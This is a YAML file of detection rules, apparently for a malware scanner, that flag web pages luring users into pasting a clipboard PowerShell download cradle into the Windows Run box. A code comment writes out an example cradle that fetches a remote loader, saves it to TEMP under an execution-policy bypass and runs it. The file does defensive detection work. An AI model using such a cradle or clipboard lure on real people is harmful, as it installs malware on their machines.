defaults:
  platforms: [windows]
  for: [html, javascript]
  attack: T1204.001,T1059.001,T1105
  mbc: B0030


composite_rules:
  - id: clipboard-webclient-iex-cradle
    desc: Clipboard lure with hidden WebClient evaluation
    crit: hostile
    conf: 0.98
    all:
      - id: micro-behaviors/os/clipboard/write::browser-clipboard-write
      - id: micro-behaviors/process/deploy/script-eval/network::embedded-powershell-webclient-script-eval
      - id: micro-behaviors/process/argument/visibility::powershell-hidden-ep-bypass-flags
    any:
      - id: micro-behaviors/ui/help/interaction::html-winr-shortcut-instruction
      - id: micro-behaviors/ui/help/interaction::paste-enter-instruction-generic
      - id: objectives/execution/lure/clipboard/page::remote-human-check-page
    near_bytes: 1600
# Sibling cradle that stages Invoke-WebRequest -OutFile to TEMP plus a policy
# bypass instead of hidden-window IEX DownloadString: `cmd /c start /min
# powershell -ep bypass -C "iwr http://host/loader.ps1 -OutFile $env:TEMP\..;
# & ..."` copied to the clipboard beside paste-run instructions. Any
# clipboard-write spelling counts: pages alias the document object and
# builders ship the page script as a string, so gating on writeText alone
# misses the execCommand form.
  - id: clipboard-iwr-file-download-cradle
    desc: Clipboard lure with IWR file download and policy bypass
    crit: hostile
    conf: 0.98
    for: [html]
    all:
      - id: micro-behaviors/communications/http/download/cli/web-cmdlet::embedded-iwr-outfile-download
      - id: micro-behaviors/process/argument/interpreter::powershell-policy-bypass-argument
      - id: objectives/execution/lure/clipboard/instruction::remote-ctrlv-instruction
    any:
      - id: micro-behaviors/os/clipboard/write::browser-execcommand-copy
      - id: micro-behaviors/os/clipboard/write::browser-clipboarddata-setdata
      - id: micro-behaviors/os/clipboard/write::browser-clipboard-write
      - id: micro-behaviors/os/clipboard/write::browser-clipboard-copy-command
      - id: micro-behaviors/os/clipboard/write::browser-dom-clipboard-copy
